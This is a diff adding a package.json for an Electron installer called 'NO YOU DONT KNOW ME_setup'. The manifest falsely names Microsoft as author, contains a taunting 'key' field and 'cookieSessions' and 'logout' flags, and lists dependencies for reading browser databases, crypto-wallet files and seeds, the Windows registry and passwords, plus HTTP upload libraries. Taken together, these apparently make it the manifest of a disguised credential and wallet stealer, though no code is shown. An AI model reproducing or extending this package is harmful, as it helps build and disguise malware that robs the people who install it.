@@ -1,0 +1,65 @@
+{
+  "name": "NO YOU DONT KNOW ME_setup",
+  "productName": "NO YOU DONT KNOW ME_setup",
+  "version": "1.0.0",
+  "description": "NO YOU DONT KNOW ME",
+  "main": "src/index.js",
+  "key": "LMAOOOOOOO ARE YOU LOOKING AT THE KEY ???? XDDDDDDD",
+  "logout": "true",
+  "ui": "false",
+  "cookieSessions": "true",
+  "author": "Copyright Microsoft Corporation. All rights reserved.",
+  "license": "MIT",
+  "config": {
+    "forge": {
+      "packagerConfig": {},
+      "makers": [
+        {
+          "name": "@electron-forge/maker-squirrel",
+          "config": {
+            "name": "app"
+          }
+        },
+        {
+          "name": "@electron-forge/maker-zip",
+          "platforms": [
+            "darwin"
+          ]
+        },
+        {
+          "name": "@electron-forge/maker-deb",
+          "config": {}
+        },
+        {
+          "name": "@electron-forge/maker-rpm",
+          "config": {}
+        }
+      ]
+    }
+  },
+  "dependencies": {
+    "adm-zip": "^0.5.10",
+    "axios": "^0.27.2",
+    "better-sqlite3": "^7.5.3",
+    "bitcoin-seed": "^1.0.0",
+    "buffer-replace": "^1.0.0",
+    "child_process": "^1.0.2",
+    "crypto": "^1.0.1",
+    "electron-squirrel-startup": "^1.0.0",
+    "ethers": "^6.3.0",
+    "form-data": "^4.0.0",
+    "fs": "^0.0.1-security",
+    "glob": "^7.2.3",
+    "iconv-lite": "^0.6.3",
+    "node-fetch": "^2.6.7",
+    "node-forge": "^1.3.1",
+    "node-passworder": "^2.0.4",
+    "os": "^0.1.2",
+    "path": "^0.12.7",
+    "seco-file": "^1.2.0",
+    "sleep": "^6.3.0",
+    "win-protect": "^1.0.0",
+    "winreg": "^1.2.4",
+    "zlib": "^1.0.5"
+  }
+}
